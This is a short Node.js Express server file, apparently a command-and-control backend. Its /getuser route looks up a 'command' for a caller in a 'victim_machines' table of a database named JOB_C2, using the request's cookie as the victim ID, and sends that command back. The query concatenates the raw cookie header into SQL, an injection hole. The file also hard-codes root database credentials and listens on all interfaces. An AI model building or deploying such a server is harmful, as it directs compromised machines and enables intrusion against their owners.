let express = require('express'); 
let cookieParser = require('cookie-parser'); 
//setup express app 
let app = express() 

var mysql = require('mysql');

app.use(cookieParser()); 

var con = mysql.createConnection({
	host: "localhost",
	user: "root",
	password: "newpassword",
	database: "JOB_C2"
});

//basic route for homepage 
app.get('/', (req, res)=>{ 
res.send('welcome to express app'); 
}); 

//JSON object to be added to cookie 
let users = { 
name : "69", 
Age : "18"
} 

//Route for adding cookie 
app.get('/setuser', (req, res)=>{ 
res.cookie("userData", users); 
res.send('user data added to cookie'); 
}); 

//Iterate users data from cookie 
app.get('/getuser', (req, res)=>{ 
	//console.log(req);
	console.log("Cookies:");
	console.log(req.headers.cookie);
	console.log("Done with cookies");
	//shows all the cookies 
	//res.send(req.cookies); 
	
	con.query("SELECT command FROM victim_machines WHERE victim_id='" + req.headers.cookie + "'", function(err, result, fields) {
		if (err) throw err;
		console.log(result);
		res.send(result[0].command);
	});
}); 

//Route for destroying cookie 
app.get('/logout', (req, res)=>{ 
//it will clear the userData cookie 
res.clearCookie('userData'); 
res.send('user logout successfully'); 
}); 


//server listens to port 3000 
app.listen(3000, '0.0.0.0', (err)=>{ 
if(err) 
throw err; 
console.log('listening on port 3000'); 
}); 
